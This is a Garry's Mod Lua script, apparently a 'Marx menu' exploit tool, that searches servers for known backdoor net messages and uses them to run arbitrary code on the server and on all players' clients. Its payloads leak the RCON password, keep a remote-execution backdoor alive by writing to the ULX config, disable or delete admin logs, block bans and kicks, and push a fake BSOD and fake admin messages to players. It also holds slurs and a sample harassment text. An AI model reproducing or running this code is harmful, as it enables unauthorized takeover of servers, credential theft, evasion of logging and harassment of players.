local random = {}

function random.string(len)
	if !len or len <= 0 then return '' end
	return random.string(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")[math.random(1, 62)]
end

-- thx to SNTE https://steamcommunity.com/sharedfiles/filedetails/?id=1308262997
local bad_nets = {
    "Sbox_gm_attackofnullday_key", 
    "c", 
    "enablevac", 
    "ULXQUERY2", 
    "Im_SOCool",
    "MoonMan", 
    "LickMeOut", 
    "SessionBackdoor", 
    "OdiumBackDoor", 
    "ULX_QUERY2",
    "nocheat", 
    "Sbox_itemstore", 
    "Sbox_darkrp", 
    "Sbox_Message",
    "_blacksmurf", 
    "nostrip",
    "Remove_Exploiters", 
    "Sandbox_ArmDupe", 
    "rconadmin", 
    "jesuslebg",
    "zilnix", 
    "Þà?D)◘", 
    "disablebackdoor", 
    "blacksmurfBackdoor",
    "jeveuttonrconleul",
    "memeDoor", 
    "DarkRP_AdminWeapons",
    "Fix_Keypads", 
    "noclipcloakaesp_chat_text", 
    "_CAC_ReadMemory",
    "Ulib_Message", 
    "Ulogs_Infos", 
    "ITEM", 
    "fix", 
    "nocheat",
    "Sandbox_GayParty", 
    "DarkRP_UTF8", 
    "OldNetReadData", 
    "Backdoor", 
    "cucked", 
    "NoNerks", 
    "kek", 
    "ZimbaBackdoor",
    "something", 
    "random", 
    "strip0", 
    "fellosnake", 
    "idk",
    "killserver", 
    "fuckserver", 
    "cvaraccess", 
    "rcon",
    "rconadmin", 
    "web", 
    "dontforget", 
    "aze46aez67z67z64dcv4bt",
    "nolag", 
    "changename", 
    "music", 
    "_Defqon", 
    "xenoexistscl",
    "R8",
    "DefqonBackdoor",
    "fourhead",
    "echangeinfo",
    "PlayerItemPickUp",
    "kill",
    "Þ� ?D)◘",
    "thefrenchenculer",
    "elfamosabackdoormdr",
    "stoppk",
    "noprop",
    "reaper",
    "Abcdefgh",
    "JSQuery.Data(Post(false))",
    "pjHabrp9EY",
    "_Raze",
    "NoOdium_ReadPing",
    "m9k_explosionradius",
    "gag",
    "_cac_",
    "_Battleye_Meme_",
    "ULogs_B",
    "arivia",
    "_Warns",
    "striphelper",
    "m9k_explosive",
    "GaySploitBackdoor",
    "_GaySploit",
    "slua",
    "Bilboard.adverts:Spawn(false)",
    "BOOST_FPS",
    "FPP_AntiStrip",
    "ULX_QUERY_TEST2",
    "FADMIN_ANTICRASH",
    "ULX_ANTI_BACKDOOR",
    "UKT_MOMOS",
    "rcivluz",
    "SENDTEST",
    "_clientcvars",
    "_main",
    "GMOD_NETDBG",
    "thereaper",
    "audisquad_lua",
    "anticrash",
    "ZernaxBackdoor",
    "bdsm",
    "waoz",
    "stream",
    "adm_network",
    "antiexploit",
    "ReadPing"
}

local validNet = {}

local curNet = ""

if marx_menu_NET then
	curNet = marx_menu_NET
else
	for i=#bad_nets, 1, -1 do
		if net.Receivers[ bad_nets[i]:lower() ] then
			validNet[ #validNet + 1 ] = bad_nets[i]
		end
	end

	if #validNet == 0 then
		print("404: No backdoor found.")
		return
	end
end

local function slua(s, serverside)

	local data = util.Compress(s)
	local len = #data

	net.Start(curNet)
		net.WriteBit(serverside == true)
		net.WriteUInt(len,16)
		net.WriteData(data,len)
	net.SendToServer()

end

local function askYesNo(question, callback, yes, no)
	local dermAsk = vgui.Create("DFrame")
	dermAsk:SetSize(200,200)
	dermAsk:SetTitle(question .. " ?")
	dermAsk:Center()
	dermAsk:ShowCloseButton(false)
	dermAsk.btnClose:SetVisible(true)
	dermAsk:MakePopup()

	local YESIWANT = vgui.Create("DButton",dermAsk)
	YESIWANT:Dock(LEFT)
	
	if isstring(yes) then
		YESIWANT:SetText(yes)
	else
		YESIWANT:SetText("Yes")
	end
	
	function YESIWANT:DoClick()
		dermAsk:Close()
		callback(true)
	end

	local NOIDONTWANT = vgui.Create("DButton",dermAsk)
	NOIDONTWANT:Dock(RIGHT)

	if isstring(no) then
		NOIDONTWANT:SetText(no)
	else
		NOIDONTWANT:SetText("No")
	end

	function NOIDONTWANT:DoClick()
		dermAsk:Close()
		callback(false)
	end
end

local function askText(question, callback)
	local dermAsk = vgui.Create("DFrame")
	dermAsk:SetSize(200,200)
	dermAsk:SetTitle(question .. " ?")
	dermAsk:Center()
	dermAsk:ShowCloseButton(false)
	dermAsk.btnClose:SetVisible(true)
	dermAsk:MakePopup()

	local texty = vgui.Create("DTextEntry",dermAsk)
	texty:Dock(FILL)
	texty:SetDrawLanguageID(false)
	texty:SetMultiline(true)

	local butGo = vgui.Create("DButton",dermAsk)
	butGo:Dock(BOTTOM)
	function butGo:DoClick()
		dermAsk:Close()
		local ans = string.Replace(string.Replace(texty:GetText(),'[[',''),']]','')
		callback(ans)
	end
end

local function drawCircle(x,y,radius,seg) -- thanks workshop
	if radius <= 0 then return end
	local cir = {}

	table.insert( cir, { x = x, y = y, u = 0.5, v = 0.5 } )
	for i = 0, seg do
		local a = math.rad( ( i / seg ) * -360 )
		table.insert( cir, { x = x + math.sin( a ) * radius, y = y + math.cos( a ) * radius, u = math.sin( a ) / 2 + 0.5, v = math.cos( a ) / 2 + 0.5 } )
	end

	local a = math.rad( 0 )
	table.insert( cir, { x = x + math.sin( a ) * radius, y = y + math.cos( a ) * radius, u = math.sin( a ) / 2 + 0.5, v = math.cos( a ) / 2 + 0.5 } )

	surface.DrawPoly( cir )
end

local scroll -- declare var

local window = vgui.Create("DFrame")
window:SetSize(400,400)
window:SetTitle("")
window:SetDeleteOnClose(true)
window:ShowCloseButton(false)
function window:Paint(w,h)
	surface.SetDrawColor(10,10,10)
	surface.DrawRect(0,0,w,21)

	surface.SetDrawColor(10,200,200)
	surface.DrawRect(0,21,w,1)

	surface.SetDrawColor(50,50,50)
	surface.DrawRect(0,22,w,h - 22)

	draw.SimpleText("Marx menu", "DermaDefaultBold", w / 2, 4, Color(255,255,255), TEXT_ALIGN_CENTER)
end
window:Center()

-- Close button
window.btnClose:SetVisible(true)
window.btnClose:SetColor(Color(255,0,0))
window.btnClose.Paint = function(self,w,h)
	draw.SimpleText("❌","CenterPrintText",15,0,Color(255,0,0))
end

window:MakePopup()

local animData = {} -- var used for animations

local BIG_RED_BUTTON = vgui.Create("DButton",window)
BIG_RED_BUTTON:SetSize(300,300)
BIG_RED_BUTTON:SetFont("DermaLarge")
BIG_RED_BUTTON:SetColor(Color(255,255,255))
BIG_RED_BUTTON:SetText("")
BIG_RED_BUTTON:Center()

animData[BIG_RED_BUTTON] = { "INITIALIZATION", true, Vector(1,1,1), Vector(0.03,0.9,0.9), 0 }

function BIG_RED_BUTTON:Paint(w,h)
	draw.NoTexture()

	surface.SetDrawColor(30,30,30)
	local rad = math.abs(math.sin(CurTime()/1.5)) * 150

	if animData[self][5] == 2 then
		drawCircle(150,150,rad,60)
		if rad < 1 then
			self:Remove()
			scroll:SetVisible(true)
			animData[self] = nil -- free memory
			for _, v in ipairs(scroll:GetCanvas():GetChildren()) do
				local _, y = v:GetPos()
				v:MoveTo(45,y,0.6,y / 400,0.6)
				v:AlphaTo(255,0.6,y / 400)
			end
			return
		end
	else
		if animData[self][5] == 1 && rad >= 149.5 then
			animData[self][5] = 2
		end
		drawCircle(150,150,150,60)
	end

	if !animData[self][2] && animData[self][4]:DistToSqr(Vector(0.9,0.03,0.03)) < 100 then
		animData[self][4] = LerpVector(2*FrameTime(), animData[self][4], Vector(0.9,0.03,0.03) )
	end
	surface.SetDrawColor(animData[self][4]:ToColor())
	drawCircle(150,150,rad,60)

	surface.SetDrawColor(30,30,30)
	drawCircle(150,150,rad - 10,30)

	surface.SetTextColor(animData[self][3]:ToColor())
	surface.SetFont("DermaLarge")
	local width, height = surface.GetTextSize(animData[self][1])

	if animData[self][2] then
		animData[self][3] = LerpVector(3*FrameTime(), animData[self][3], (self:IsHovered() && Vector(0,0.9,0.9) || Vector(0.9,0.9,0.9)) )

		surface.SetTextPos( w / 2 - width / 2, h / 2 - height / 2 )
		surface.DrawText(animData[self][1])
	else
		animData[self][3] = LerpVector(3*FrameTime(), animData[self][3], (self:IsHovered() && Vector(1,0,0) || Vector(0.9,0.9,0.9)) )

		surface.SetTextPos( w / 2 - width / 2, h / 2 - height )
		surface.DrawText(animData[self][1])

		width, height = surface.GetTextSize("CHOOSE ONE")
		surface.SetTextPos( w / 2 - width / 2, h / 2 + height / 4 )
		surface.DrawText("CHOOSE ONE")

	end
end

function BIG_RED_BUTTON:DoClick()
	if animData[self][5] ~= 0 then return end

	if marx_menu_NET then
		animData[self][1] = ""
		animData[self][2] = true
		animData[self][5] = 1
		return
	end

	if animData[self][2] then
		animData[self][2] = false
		animData[self][1] = "MULTIPLE NET"
	else
		local dmenu = DermaMenu(BIG_RED_BUTTON)
		for i=1, #validNet do
			dmenu:AddOption(validNet[i], function()
				local rdmNet = random.string(10)
				net.Start(curNet)
					net.WriteString([=[
util.AddNetworkString("]=] .. rdmNet .. [=[")
local function slua(str,ply)
	local d = util.Compress(str)
	local i = #d
	net.Start("]=] .. rdmNet .. [=[")
	net.WriteUInt(i,16)
	net.WriteData(d,i)
	if ply then
		net.Send(ply)
	else
		net.Broadcast()
	end
end
net.Receive("]=] .. rdmNet .. [=[",function()
	local serverside = net.ReadBit()
	local str = util.Decompress(net.ReadData(net.ReadUInt(16)))
	if serverside == 1 then
		CompileString(str,"\xFF\xFF\xFF",false)()
	else
		local ply = net.ReadEntity()
		slua(str, IsValid(ply) && ply:IsPlayer() && ply )
	end
end)
BroadcastLua([[net.Receive("]=] .. rdmNet .. [=[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"\xFF\xFF\xFF")()end)]])
hook.Add("PlayerInitialSpawn","\xFF\xFF\xFF",function(ply)
	ply:SendLua([[net.Receive("]=] .. rdmNet .. [=[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"\xFF\xFF\xFF")()end)]])
end)
]=])
					net.WriteBit(1)
				net.SendToServer()
				chat.AddText(Color(255,0,0), "NetID: " .. rdmNet)
				curNet = rdmNet
				marx_menu_NET = rdmNet
				animData[self][1] = ""
				animData[self][2] = true
				animData[self][5] = 1
			end)
		end
		dmenu:Open()
	end
end

scroll = vgui.Create("DScrollPanel",window)
scroll:DockMargin(0,0,0,0)
scroll:Dock(FILL)
scroll:SetVisible(false)

-- remove scrollbar
for _, v in ipairs(scroll:GetVBar():GetChildren()) do
	v.Paint = nil
end
scroll:GetVBar().Paint = nil

local butIndex = 0
local function addBackdoor(text, desc, todo, serverside)
	local but = vgui.Create("DButton")
	scroll:AddItem(but)
	if desc then
		but:SetTooltip(desc)
	end
	but:SetSize(300,30)
	but:SetPos(80, butIndex * 43)
	but:SetText(text)
	but:SetAlpha(0)
	but:SetFont("Trebuchet18")
	but:SetColor(Color(180,180,180))
	animData[but] = Vector(0.11,0.11,0.11)

	function but:Paint(w,h)
		animData[self] = LerpVector(4*FrameTime(),animData[self], self:IsHovered() && Vector(0.06,0.06,0.06) || Vector(0.11,0.11,0.11) )
		surface.SetDrawColor(animData[self]:ToColor())
		surface.DrawRect(0,0,w,h)
	end

	if isfunction(todo) then
		function but:DoClick()
			animData[self] = Vector(0,0.9,0.9)
			surface.PlaySound("buttons/button9.wav")
			todo()
		end
	elseif isstring(todo) then
		function but:DoClick()
			animData[self] = Vector(0,0.9,0.9)
			surface.PlaySound("buttons/button9.wav")
			slua(todo, serverside)
		end
	end

	butIndex = butIndex + 1
end

addBackdoor("Disable ulx echo", "stealth increased to OVER 9000", [[
RunConsoleCommand("ulx","logecho","0")
]], true)

if ulx then

	addBackdoor("Fake add superadmin", "Display fake (Console) added You superadmin in chat", [[
local function parseColor(var)
	var = "ulx_" .. var
	if !ConVarExists(var) then return Color(0,0,0) end
	local col = string.Explode(" ", GetConVar(var):GetString(), false)
	return Color(col[1],col[2],col[3])
end
local d = parseColor("logEchoColorDefault")
chat.AddText(
	parseColor("logEchoColorConsole"), "(Console) ",
	d, "added ",
	parseColor("logEchoColorSelf"), "You ",
	d, "to group ",
	parseColor("logEchoColorMisc"), "superadmin")
]])

	addBackdoor("Persistent with ULX", "Add the \"c\" backdoor by writing to ULX config", [=[
if !( string.find(file.Read("ulx/config.txt"),[[util.AddNetworkString("c")]]) ) then
	file.Append("ulx/config.txt",[[\nutil.AddNetworkString("c");net.Receive("c",function()CompileString(net.ReadString(),"\xFF",false)()end)"]])
	util.AddNetworkString("c");net.Receive("c",function()CompileString(net.ReadString(),"\xFF",false)()end)
end
]=], true)

end

addBackdoor("Disco roads", "Make roads behave like a disco floor", function()
	local textures = {
		["gm_genesis"] = {
			"CONCRETE/CONCRETEFLOOR037C",
			"maps/gm_genesis_b35/concrete/concretefloor033k_c17_-5120_13312_-8192",
			"maps/gm_genesis_b35/concrete/concretefloor033k_c17_-8704_11776_-7936",
			"maps/gm_genesis_b35/concrete/concretefloor019a_5632_-8192_-7680",
			"maps/gm_genesis_b35/concrete/concretefloor019a_1536_-8704_-8192",
			"maps/gm_genesis_b35/concrete/concretefloor019a_-1792_-9088_-8128",
			"maps/gm_genesis_b35/concrete/concretefloor019a_-1792_-7232_-8128",
			"maps/gm_genesis_b35/concrete/concretefloor019a_-4352_-7296_-8128",
			"maps/gm_genesis_b35/concrete/concretefloor019a_-4352_-9088_-8128",
			"CONCRETE/CONCRETEWALL001A",
			"maps/gm_genesis_b35/concrete/concretefloor033k_8192_0_-13312",
			"maps/gm_genesis_b35/concrete/concretefloor033k_8192_-8192_-13312",
			"maps/gm_genesis_b35/concrete/concretefloor033k_0_-8192_-13312",
			"maps/gm_genesis_b35/concrete/concretefloor033k_-8192_-8192_-13312",
			"maps/gm_genesis_b35/concrete/concretefloor033k_-8192_0_-13312",
			"maps/gm_genesis_b35/concrete/concretefloor033k_-8192_8192_-13312",
			"maps/gm_genesis_b35/concrete/concretefloor033k_0_8192_-13312",
			"maps/gm_genesis_b35/concrete/concretefloor033k_8192_8192_-13312",
			"maps/gm_genesis_b35/concrete/concretefloor033k_9088_4736_-7936",
			"maps/gm_genesis_b35/concrete/concretefloor033k_7040_4736_-7936",
			"maps/gm_genesis_b35/concrete/concretefloor033k_-12288_0_-8192"
		},
		["gm_bigcity"] = {
			"maps/gm_bigcity67d3/stone/stonefloor006a_-7808_-5952_-10816",
			"maps/gm_bigcity67d3/stone/stonefloor006b_-7808_-5952_-10816",
			"BUILDING_TEMPLATE/CONCRETEFLOOR033AZ",
			"BUILDING_TEMPLATE/CONCRETEFLOOR033KZ",
			"BUILDING_TEMPLATE/CONCRETEFLOOR033CZ",
			"BUILDING_TEMPLATE/CONCRETEFLOOR033YZ",
			"BUILDING_TEMPLATE/CONCRETEFLOOR033BZ",
			"maps/gm_bigcity67d3/cs_assault/pavement001_-7808_-5952_-10816",
			"maps/gm_bigcity67d3/cs_assault/rightcurb001_-7808_-5952_-10816",
			"maps/gm_bigcity67d3/cs_assault/pavement001a_-7808_-5952_-10816",
			"METAL/METALHULL010B"
		},
		["gm_construct"] = {
			"maps/gm_construct/concrete/concretefloor028a_-2408_-2702_329",
			"maps/gm_construct/concrete/concretefloor028a_-2368_-1536_-96",
			"maps/gm_construct/concrete/concretefloor028a_1280_-1600_-64",
			"maps/gm_construct/concrete/concretefloor028a_128_-576_-96",
			"maps/gm_construct/concrete/concretefloor028a_-1792_-1536_-96",
			"maps/gm_construct/concrete/concretefloor028a_1436_-571_-71",
			"maps/gm_construct/concrete/concretefloor028a_-2304_-2702_864",
			"GM_CONSTRUCT/CONSTRUCT_CONCRETE_GROUND",
			"maps/gm_construct/concrete/concretefloor028a_-4416_4160_320",
			"maps/gm_construct/concrete/concretefloor028a_-4448_5312_0",
			"maps/gm_construct/concrete/concretefloor028a_-3395_5265_843",
			"maps/gm_construct/concrete/concretefloor028a_1280_5760_64",
			"GM_CONSTRUCT/CONSTRUCT_CONCRETE_FLOOR",
			"CONCRETE/CONCRETECEILING001A",
			"maps/gm_construct/concrete/concretefloor028a_832_384_-96",
			"maps/gm_construct/concrete/concretefloor028a_1472_608_-71",
			"maps/gm_construct/concrete/concretefloor028a_832_-448_-96",
			"maps/gm_construct/concrete/concretefloor028a_1280_2432_32",
			"maps/gm_construct/concrete/concretefloor028a_1344_3584_32",
			"maps/gm_construct/concrete/concretefloor028a_-256_-1472_-96",
			"maps/gm_construct/concrete/concretefloor028a_-1280_-1536_-96"
		},
		["gm_flatgrass"] = {
			"GM_CONSTRUCT/FLATGRASS"
		},
		["rp_trust_city_v1"] = {
			"ajacks/ajacks_road7",
			"ajacks/ajacks_road8"
		},
		["rp_chaoscity_trust_v2"] = {
			"HALL_CONCRETE/HALL_CONCRETE11_WET",
			"ajacks/ajacks_road8",
			"ajacks/ajacks_10",
			"SGTSICKTEXTURES/GUNROAD_01",
			"SGTSICKTEXTURES/GUNROAD_02",
			"CONCRETE/CONCRETEFLOOR038A",
			"ajacks/ajacks_road7"
		}
	}
	local map = game.GetMap()
	if !textures[map] then
		chat.AddText(Color(255,0,0),"[MARX]: map isn't registred, ask Maks to add it")
		return
	end

	local textureTable = ""
	for i=#textures[map], 1, -1 do
		textureTable = textureTable .. '"' .. textures[map][i] .. '"' .. ((i==1) && "" || ",")
	end

	slua([[
local textures = { ]] .. textureTable .. [[ }
if !textures then return end
local materials = {}
for i=#textures, 1, -1 do
	local mat = Material(textures[i])
	if mat:IsError() || mat:GetString("$basetexture") == "" then return end
	mat:SetTexture("$basetexture","models/debug/debugwhite")
	materials[ #materials + 1 ] = mat
end
local beforeUpdate = CurTime()
hook.Add("PostRender","\xFF\xFF\xFF",function()
	if beforeUpdate > CurTime() then return end
	beforeUpdate = CurTime() + 0.2
	for i=#materials, 1, -1 do
		materials[i]:SetVector("$color", Vector(math.random(0,255) / 255, math.random(0,255) / 255,math.random(0,255) / 255))
	end
end)
]])
end)

-- Samples:
-- No, we aren't ISIS - Type !faggot in chat for a surprise - Join us at ts.whore.org - MOM I'M HUNGRY - Yes, the server won't know we were there - The music is nice
-- Non, nous ne sommes pas DAESH  -  Tapez !faggot dans le chat pour une surprise  -  Rejoignez-nous sur TS: ts.whore.org  -  MAMAN J'AI FAIM  -  Oui, le serveur n'aura aucune trace de notre passage  -  Elle est cool cette musique en vrai
addBackdoor("Show HUD", "Add to EVERYONE a nice HUD with YOUR text", function()
	askText("Scrolling text", function(ans)
		slua([=[
local startTime = CurTime()
local text = [[]=] .. ans .. [=[]]
surface.CreateFont("\xFF\xFF\xFF",{
	font = "Impact",
	size = 999
})
hook.Add("HUDPaint","\xFF\xFF\xFF",function()
	surface.SetDrawColor(20,20,20)
	surface.DrawRect(0, ScrH() - ScrH() / 8, ScrW(), ScrH() / 8)

	surface.SetFont("\xFF\xFF\xFF")
	local _, height = surface.GetTextSize("CYPHER")
	surface.SetTextPos(20, ScrH() - ScrH() / 8 - height / 1.5 )
	surface.SetTextColor(20,20,20)
	surface.DrawText("CYPHER")

	surface.SetFont("Trebuchet24")
	local width, height = surface.GetTextSize(text)
	local offset = ( CurTime() - startTime ) * 100

	if offset - ScrW() > width then
		startTime = CurTime()
	end

	surface.SetTextColor(20,240,240)
	surface.SetTextPos( ScrW() - offset, ScrH() - ScrH() / 8 / 2 - height / 2)
	surface.DrawText(text)
end)
]=])
	end)
end)

addBackdoor("Rainbow physgun", "Physgun beam is rainbow for everyone", [[
hook.Add("Think","\xFF\xFF\xFF",function()
	local col = HSVToColor(CurTime() * 50 % 360, 1, 1)
	for _, v in ipairs(player.GetAll()) do
		v:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255))
	end
end)
]], true)

addBackdoor("Dance", "Everyone dance", [[
RunConsoleCommand("act","dance")
]])

addBackdoor("Play youtube URL", nil, function()
	askText("URL", function(ans)
		if !string.StartWith(ans,"https://www.youtube.com/watch?v=") then
			chat.AddText(Color(255,0,0),"[MARX]: Invalid youtube link")
			return
		end

		ans = string.Replace(ans,"https://www.youtube.com/watch?v=","")

		slua([[
ytLINK = vgui.Create("DHTML")
ytLINK:OpenURL("https://www.youtube.com/embed/]] .. ans .. [[?autoplay=1")
ytLINK:SetSize(500,500)
]])
	end)
end)

addBackdoor("Play URL", nil, function()
	-- https://instaud.io/_/2ms4.mp3
	askText("URL", function(ans)
		if string.EndsWith(ans,".mp3") then
			slua([[
sound.PlayURL("]] .. ans .. [[","",function(s)
	if IsValid(s) then
		s:Play()
	end
end)
]])
		else
			slua([[
ytLINK = vgui.Create("DHTML")
ytLINK:OpenURL("]] .. ans .. [[")
ytLINK:SetSize(1000,1000)
]])

		end
	end)
end)

addBackdoor("Remove ULX ban", "Remove the ability to ban / kick", [=[
function ULib.kick(_,_,ply)
	ply:ChatPrint("This command is unavailable")
end
function ULib.ban(_,_,_,ply)
	ply:ChatPrint("This command is unavailable")
end
function ULib.addBan(_,_,_,_,ply)
	ply:ChatPrint("This command is unavailable")
end
]=], true)

addBackdoor("!faggot BSOD", "When someone type !faggot in chat they get a BSOD", [[
hook.Add("OnPlayerChat","\xFF\xFF\xFF",function(ply, text)
	if ply == LocalPlayer() && string.Trim(text) == "!faggot" then
		local d = vgui.Create("DHTML")
		d:SetSize(ScrW(),ScrH())
		d:SetHTML([=[<html>
<head>
	<link rel="stylesheet" href="http://fakebsod.com/style.css">
</head>
<body id="win8">
	<div id="sadface"></div>
	<p id="win8topblock">
	Your PC ran into a problem that it couldn't handle,
	and now it needs to restart. We're just collecting some error info, and then we'll restart for you.</p>
	<p id="win8errorblock">If you'd like to know more, you can search online later for this error: GM_CONSTRUCT</p>
</body>
</html>]=])
		d:SetKeyboardInputEnabled(true)
	end
end)
]])

addBackdoor("Print RCON", "Print server's RCON in chat", [=[
Entity(]=] .. LocalPlayer():EntIndex() .. [=[):ChatPrint(string.match(file.Read("cfg/server.cfg", "GAME"), [[rcon_password%s-"(.-)"]]))
]=], true)

addBackdoor("Notify", "Display text at the center of the screen", function()
	askText("Text", function(ans)
		slua([=[
surface.PlaySound("buttons/button3.wav")
hook.Add("HUDPaint","\xFF\xFF\xFFNOTIF",function()
	surface.SetDrawColor(0,0,0,220)
	surface.DrawRect(0,ScrH() / 8, ScrW(), 100)

	local text = [[]=] .. ans .. [=[]]
	surface.SetTextColor(255,0,0)
	surface.SetFont("DermaLarge")
	local width, height = surface.GetTextSize(text)
	surface.SetTextPos(ScrW() / 2 - width / 2, ScrH() / 8 + height)
	surface.DrawText(text)
end)
timer.Simple(7,function()
	hook.Remove("HUDPaint","\xFF\xFF\xFFNOTIF")
end)
]=])
	end)
end)

addBackdoor("Rename server", nil, function()
	askText("New name", function(ans)
		slua([=[
RunConsoleCommand("hostname",[[]=] .. ans .. [=[]])
]=], true)
	end)
end)

addBackdoor("Change convar", "Change a server convar to your liking", function()
	askText("Convar", function(var)
		askText("Value", function(val)
			slua([=[
RunConsoleCommand([[]=] .. var .. [=[]],[[]=] .. val .. [=[]])
]=], true)
		end)
	end)
end)

addBackdoor("Reverse gravity", "Reverse player's gravity", [[
for _, v in ipairs(player.GetAll()) do
	v:SetGravity(-0.01)
end
]], true)

addBackdoor("Say all", "Everyone say something", function()
	askText("Phrase", function(ans)
		slua([=[
RunConsoleCommand("say","]=] .. ans .. [=[")
]=])
	end)
end)

addBackdoor("Text hat", "Add a text above players' head", function()
	askText("Text", function(ans)
		slua([=[
surface.CreateFont("\xFF\xFF\xFF\xFF\xFF", {
		font = "Arial",
		size = 200
})
hook.Add("PostPlayerDraw","\xFF\xFF\xFF",function(ply)
	local _, plyHeight = ply:GetModelRenderBounds()
	local plyPos = ply:GetPos() + Vector(0, 0, plyHeight.z + 20)
	local height = math.abs(math.sin(CurTime())) * 100
	cam.Start3D2D(plyPos, Angle(0, CurTime()*40 % 360, 90), 0.09)
		draw.DrawText("]=] .. ans .. [=[", "\xFF\xFF\xFF\xFF\xFF", 0, height, Color(255, 0, 0), TEXT_ALIGN_CENTER)
	cam.End3D2D()
	cam.Start3D2D(plyPos, Angle(0, CurTime()*40 % 360 + 180, 90), 0.09)
		draw.DrawText("]=] .. ans .. [=[", "\xFF\xFF\xFF\xFF\xFF", 0, height, Color(255, 0, 0), TEXT_ALIGN_CENTER)
	cam.End3D2D()
end)
]=])
	end)
end)

addBackdoor("Rainbow sky", "RAINBOW RAINBOW RAINBOW RAINBOW", [[
local name = GetConVar("sv_skyname"):GetString()
if name == "painted" then
	local sky
	for _, v in ipairs(ents.GetAll()) do
		if v:GetClass() == "env_skypaint" then
			sky = v
			break
		end
	end
	if !IsValid(sky) then return end
	hook.Add("PostRender","\xFFsky\xFF",function()
		local col = HSVToColor(CurTime()*30 % 360,1,1)
		col = Vector(col.r/255,col.g/255,col.b/255)
		sky:SetTopColor(col)
		sky:SetBottomColor(col)
	end)
else
	local prefix  = {"lf","ft","rt","bk","dn","up"}
	local mats = {}
	for i=1,6 do
		mats[#mats+1] = Material("skybox/" .. name .. prefix[i])
	end
	hook.Add("PostRender","\xFFsky\xFF",function()
		local col = HSVToColor(CurTime()*30 % 360,1,1)
		for i=1,6 do
			mats[i]:SetVector("$color",Vector(col.r/255,col.g/255,col.b/255))
		end
	end)
end
]])

addBackdoor("Give weapons", "Give everyone all weapons", [[
for _, v in ipairs(player.GetHumans()) do
	for _, w in ipairs(weapons.GetList()) do
		v:Give(w.ClassName)
	end
end
]], true)

addBackdoor("Circle sun", "Rotate the sun in circle", [[
local sun = ents.FindByClass("env_sun")
if #sun == 0 then return end
sun = sun[1]
hook.Add("Think","\xFFsun\xFF",function()
	sun:SetKeyValue("sun_dir", math.sin(CurTime())/3 .. " " .. math.cos(CurTime())/3 .. " 0.901970")
end)
]], true)

addBackdoor("Suppress cvar changer", "Remove annoying chat message, stealthy", [[
hook.Add("ChatText","\xFFnochat\xFF",function(_,_,text)
	if string.StartWith(text,"Server cvar '") then
		return true
	end
end)
]])

addBackdoor("Raining chairs", "IT's RAINING CHAIRS! HALLULUYA IT'S RAINING CHAIRS", function()
	if hook.GetTable()["PostDrawOpaqueRenderables"] && hook.GetTable()["PostDrawOpaqueRenderables"]["\xFFitsrainingchairs\xFF"] then
		slua([[
hook.Remove("PostDrawOpaqueRenderables","\xFFitsrainingchairs\xFF")
]])
	else
		slua([[
local chair = ClientsideModel("models/props_c17/chair02a.mdl")
chair:SetNoDraw(true)
local data = {}
local function genChair(id)
	local pos = LocalPlayer():GetPos()
	data[id] = { Vector(math.random(pos.x-1000,pos.x+1000),math.random(pos.y-1000,pos.y+1000),pos.z + math.random(800,1000) ), math.random(10, 70) }
end
for i=1, 70 do
	genChair(i)
end
hook.Add("PostDrawOpaqueRenderables","\xFFitsrainingchairs\xFF",function()
	local z = LocalPlayer():GetPos().z
	for i=1, #data do
		chair:SetPos(data[i][1])
		chair:SetupBones()
		chair:DrawModel()
		data[i][1].z = data[i][1].z - data[i][2] / 20
		if data[i][1].z <= z then
			genChair(i)
		end
	end
end)
]])
	end
end)

addBackdoor("Disable log", "Disable logs, but doesn't remove existing", function()
	if bLogs then
		slua([[
bLogs:Log(bLogs:Highlight("[CYPHER]") .. " Log disabled"))
function bLogs:Log()
	return
end
]], true)
	end

	if ULogs then
		slua([[
ULogs.AddLog(2, "[CYPHER] Log disabled")
function ULogs.AddLog()
	return
end
]], true)
	end
end)

addBackdoor("Remove logs", "Doesn't disable but remove all logs", function()
	if ULogs then
		slua([[
MySQLite.query("DELETE FROM " .. ULogs.config.TableName,nil,function()end)
]], true)
		slua([[
ULogs.Logs = {}
ULogs.Pages = 1
]])
	end
end)

addBackdoor("Open / Close doors", "The choice is yours", function()

	askYesNo("What to do with doors", function(ans)
		local mode = ans && "open" || "close"
		slua([[
for _, v in ipairs(ents.GetAll()) do
	if v:isDoor() then
		v:Fire("]] .. mode .. [[", "", .6)
		v:Fire("setanimation", "]] .. mode .. [[", .6)
	end
end
]], true)

	end, "Open", "Close")
end)

addBackdoor("MLG text", "Display custom mlg message", function()
	askText("Text", function(ans)
		slua([=[
surface.CreateFont("\xFF\xFF\xFF", {
		font = "Impact",
		size = 999
})
local t = [[]=] .. ans .. [=[]]
local mat = Matrix()
hook.Add("HUDPaint","\xFFmlg_text\xFF", function()
	if #t == 0 then
		hook.Remove("HUDPaint","\xFFmlg_text\xFF")
	end
	surface.SetFont("\xFF\xFF\xFF")
	local x = ScrW() / 2 - (surface.GetTextSize(t)/2) + math.cos(CurTime()*3) * 40
	local y = 100 + math.sin(CurTime()*2) * 40
	local pos = Vector(x,y,0)
	mat:SetAngles(Angle(0,math.sin(CurTime()/1.2)*10,0))
	mat:SetTranslation(pos)
	surface.SetTextPos(0,0)
	cam.PushModelMatrix(mat)
		for i=#t, 1, -1 do
			surface.SetTextColor( HSVToColor((CurTime()*200+i*7)%360,1,1) )
			surface.DrawText(t[ #t - i + 1 ])
		end
	cam.PopModelMatrix()
end)
]=])
	end)
end)

--[[-------------------------------------------------------------------------
Fun with players
---------------------------------------------------------------------------]]

--[[-------------------------------------------------------------------------
for _, v in ipairs(player.GetAll()) do
	for i=v:GetBoneCount(), 1, -1 do
		v:ManipulateBonePosition(i,Vector())
	end
end
---------------------------------------------------------------------------]]

addBackdoor("Extend head", "And the head goes up goes up goes up OH DAMN", [[
local start = CurTime()
hook.Add("PrePlayerDraw","\xFF\xFF\xFF",function(ply)
	local head = ply:LookupBone("ValveBiped.Bip01_Head1")
	local pos = (CurTime() - start) / 2
	ply:ManipulateBonePosition(head, Vector(pos,pos,0))
end)
]])

addBackdoor("Ping pong head / belly", "Head and belly play ping pong", [[
hook.Add("PrePlayerDraw","\xFF\xFF\xFF",function(ply)
	local head = ply:LookupBone("ValveBiped.Bip01_Head1")
	local pos = math.abs(math.sin(CurTime()*3)) * 25
	ply:ManipulateBonePosition(head, Vector(pos,pos,0))
	ply:ManipulateBoneAngles(head, Angle(0, 0, CurTime() * 100 % 360 ))
